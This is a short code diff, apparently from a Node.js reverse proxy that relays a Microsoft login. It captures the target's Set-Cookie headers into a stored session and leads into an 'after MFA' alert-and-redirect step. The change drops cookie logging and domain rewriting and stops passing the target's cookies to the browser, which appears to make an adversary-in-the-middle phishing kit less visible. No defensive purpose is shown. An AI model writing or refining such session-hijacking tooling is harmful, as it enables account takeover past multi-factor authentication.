@@ -718,16 +718,11 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
 
         const proxyResponseCookie = proxyResponse.headers["set-cookie"];
 if (proxyResponseCookie) {
-    console.log('[ORIGINAL SET-COOKIE]', JSON.stringify(proxyResponseCookie));
     updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
 
-    // ---- REWRITE Set-Cookie DOMAIN FOR CLIENT ----
-    const rewrittenCookies = proxyResponseCookie.map(cookie => {
-        return cookie.replace(/\bDomain\s*=\s*[^;]+/i, `Domain=${proxyHostname}`);
-    });
-    proxyResponse.headers["set-cookie"] = rewrittenCookies;
-    // 👇 Insert the log here
-    console.log('[REWRITTEN SET-COOKIE]', JSON.stringify(rewrittenCookies));
+    // Do NOT forward target cookies to the client – only the session cookie is needed.
+    // This prevents the browser from storing Microsoft's cookies under our domain.
+    delete proxyResponse.headers["set-cookie"];
 }
 
 // ===== FINAL ALERT & REDIRECT (after MFA) =====
